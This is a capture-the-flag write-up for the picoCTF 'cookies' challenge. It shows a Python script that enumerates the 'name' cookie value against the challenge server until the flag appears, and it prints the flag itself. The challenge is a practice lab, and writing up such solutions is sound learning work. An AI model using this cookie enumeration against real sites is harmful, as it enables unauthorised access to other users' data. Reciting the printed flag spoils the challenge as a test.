# Web Exploitation

## cookies

```
Description
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/
```

**Approach:**

The challenge description suggested experimenting with cookies, specifically, the `name` cookie's value. I started by exploring the site to understand how it handled cookies.

![image](https://github.com/user-attachments/assets/15592894-8d32-4f7c-9751-e72b03b21198)

Entering common cookie names in the search bar on the main page resulted in the `name` cookie's value changing from `-1` to values like `0`, `1`, etc.

I entered `snickerdoodle` as input which changed `name` cookie's value to 0:

![image](https://github.com/user-attachments/assets/61b9a475-05a3-4eb4-95c0-faa637e681fa)

When I changed `name` cookie's value to 1:

![image](https://github.com/user-attachments/assets/a2cc02db-17eb-4e10-b029-5178efd90102)

`That is a cookie! Not very special though...` message was coming till `name` = 28

To expedite the process, I wrote a Python script using the `requests` library to incrementally set the "name" cookie value and checked for the flag.

**Script:**

```
import requests

# URL for the check page
url = "http://mercury.picoctf.net:29649/check"

# Start value for the "name" cookie
cookie_value = 0

while True:
    # Set the cookie with the current value
    cookies = {'name': str(cookie_value)}
    
    # Make a GET request with the cookie set
    response = requests.get(url, cookies=cookies)
    
    # Check if the flag or unique message is found in the response
    if "picoCTF{" in response.text:
        print("Flag found!")
        print(response.text)
        break
    else:
        print(f"Tried cookie 'name={cookie_value}', no flag found.")
    
    # Increment the cookie value
    cookie_value += 1
```

**Output:**

![image](https://github.com/user-attachments/assets/986fa92c-d208-447f-9e60-0962d3e9d975)

By running the script, I observed that the flag was found at `name = 18`

When I changed `name` cookie's value to 18:

![image](https://github.com/user-attachments/assets/08915b6a-052e-4b3d-ae94-84b4ef1cde67)

**Flag:**

```
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}
```

**Incorrect Tangents:**

Initially, I manually entered different values for the `name` cookie but realized that it was too inefficient. This led me to try a script to systematically check the response at different values of the `name` cookie, which ultimately gave me the flag quickly and easily.
